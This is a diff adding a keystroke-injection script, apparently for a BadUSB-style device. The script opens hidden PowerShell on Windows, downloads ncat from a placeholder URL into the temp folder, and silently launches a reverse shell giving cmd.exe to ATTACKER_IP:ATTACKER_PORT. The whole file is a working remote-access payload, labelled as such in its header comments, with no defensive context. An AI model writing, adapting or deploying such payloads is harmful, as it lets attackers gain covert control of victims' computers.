@@ -1,0 +1,28 @@
+REM Author: UNC0V3R3D
+REM Description: Downloads ncat (nmap's netcat) and establishes a reverse shell.
+REM Version: 1.0
+REM Category: Remote-Access
+REM Target: Windows 10/11
+REM Requirements: Listener on ATTACKER_IP:ATTACKER_PORT (e.g. nc -lvnp 4444)
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $ip = 'ATTACKER_IP'
+ENTER
+DELAY 400
+STRING $port = 'ATTACKER_PORT'
+ENTER
+STRING $dst = "$env:TEMP\nc.exe"
+ENTER
+STRING Invoke-WebRequest -Uri 'NCAT_DOWNLOAD_URL' -OutFile $dst
+ENTER
+DELAY 2000
+STRING Start-Process $dst -ArgumentList "$ip $port -e cmd.exe" -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End of payload
